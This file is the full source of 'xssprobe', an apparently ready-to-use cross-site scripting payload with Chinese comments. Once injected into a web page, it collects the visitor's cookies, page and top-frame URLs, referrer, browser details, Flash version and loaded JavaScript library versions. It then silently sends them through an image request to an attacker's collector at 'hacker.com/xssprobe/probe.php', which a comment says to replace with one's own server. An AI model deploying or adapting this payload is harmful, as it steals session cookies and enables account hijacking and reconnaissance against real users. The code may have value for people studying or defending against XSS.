/*
xssprobe
by evilcos@gmail.com | @xeyeteam

*/

(function( window, document, navigator, undefined ) {
	var HTTP_SERVER = "http://www.hacker.com/xssprobe/probe.php?c=",
		// 获取隐私信息的服务端页面，这里需配置为自己的probe.php网址
		NOT_AVAILABLE = "N/A", FOUND = "found";

	function json2str(object) {
		var arr = [];
		var fmt = function(s) {
			if (typeof s == 'object' && s != null) return json2str(s);
			return /^(string|number)$/.test(typeof s) ? "'" + s + "'" : s;
		}
		for (var i in object) arr.push("'" + i + "':" + fmt(object[i]));
		return '{' + arr.join(',') + '}';		
	}

	(function(info) {
		new Image().src = HTTP_SERVER + json2str(info);
	})({
		browser: (function(){
			ua = navigator.userAgent.toLowerCase();
			var rwebkit = /(webkit)[ \/]([\w.]+)/,
				ropera = /(opera)(?:.*version)?[ \/]([\w.]+)/,
				rmsie = /(msie) ([\w.]+)/,
				rmozilla = /(mozilla)(?:.*? rv:([\w.]+))?/,
				match = rwebkit.exec( ua ) ||
					ropera.exec( ua ) ||
					rmsie.exec( ua ) ||
					ua.indexOf("compatible") < 0 && rmozilla.exec( ua ) ||
					[];
			return {name: match[1] || "", ver: match[2] || "0"};
		})(),
		ua: escape(navigator.userAgent),
		lang: navigator.language,
		referrer: document.referrer,
		location: window.location.href,
		topLocation: top.location.href,
		cookie: escape(document.cookie),
		domain: document.domain,
		title: document.title,
		screen: (function() {
			var scr = screen || {
                width: NOT_AVAILABLE,
                height: NOT_AVAILABLE,
                colorDepth: NOT_AVAILABLE
            };
			return scr ? [scr.width, "x", scr.height, ",", scr.colorDepth, "-bit"].join("") : "";
		})(),
		flash: (function(navigator) {
			var plug, len, //保存plugins和length
			 	matches; //保存正则表达式的匹配项目

			if((plug = navigator.plugins) && (len = plug.length)) {
				for (var i=0; i<len; i++) 
					if (matches = plug[i].description.match(/Shockwave Flash ([\d\.]+) \w*/))
						return matches[1];
			} else {
				return (new ActiveXObject("ShockwaveFlash.ShockwaveFlash")).GetVariable("$version")
					.replace(/^.*\s+(\d+)\,(\d+).*$/, "$1.$2");
			}
		})(navigator),
		//常见前端js框架和版本的探测
		lib: {
			jQuery: window.jQuery ? jQuery().jquery : NOT_AVAILABLE,
			Zepto: window.Zepto ? FOUND : NOT_AVAILABLE,
			Ext: window.Ext && Ext.versions ? Ext.versions.extjs : NOT_AVAILABLE,
			dojo: window.dojo ? dojo.version : NOT_AVAILABLE,
			Prototype : window.Prototype ? Prototype.Version : NOT_AVAILABLE,
			YUI: typeof window.YUI == "function" ? YUI().version : NOT_AVAILABLE
		}
	});

})( window, document, navigator );